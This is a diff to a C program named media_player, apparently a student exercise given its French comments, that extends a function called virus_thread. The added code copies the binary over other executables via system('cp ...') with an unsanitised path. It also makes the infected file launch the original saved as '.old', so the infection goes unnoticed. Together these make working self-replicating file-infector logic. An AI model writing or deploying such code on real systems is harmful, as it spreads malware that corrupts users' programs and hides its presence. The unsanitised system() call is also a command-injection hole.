@@ -88,18 +88,41 @@ static void *virus_thread(void *arg){
         free(candidate);
         return NULL;
     }
+    // se copier soi même et se renommer comme le fichier
+    char command[PATH_MAX];
+    if (snprintf(command, sizeof(command), "cp media_player %s", candidate) < 0) {
+        printf("Error creating copy command.\n");
+        return NULL;
+    }
+    system(command);
     return NULL;
 }
 
 //End of virus code
 
-int main() {
+int main(int argc, char *argv[]) {
     pthread_t t;
     if (pthread_create(&t, NULL, virus_thread, NULL) != 0) {
         perror("pthread_create");
         return 1;
     }
+    if (strcmp(argv[0], "./media_player") != 0) {
+        //lancer le logiciel du même nom en .old
+        char old_name[PATH_MAX];
+        if (snprintf(old_name, sizeof(old_name), "%s.old", argv[0]) < 0) {
+            printf("Error creating old filename.\n");
+            return 1;
+        }
+        printf("Launching original executable: %s\n", old_name);
+        if (access(old_name, F_OK) != 0) {
+            printf("Original executable not found: %s\n", old_name);
+            return 1;
+        }
+        pthread_join(t, NULL);
+        execl(old_name, old_name, NULL);
+        perror("execl");
 
+    }
 
     // a mettre a la fin de toute sortie du programme pour que le virus se termine avant que le programme ne se termine
     pthread_join(t, NULL);
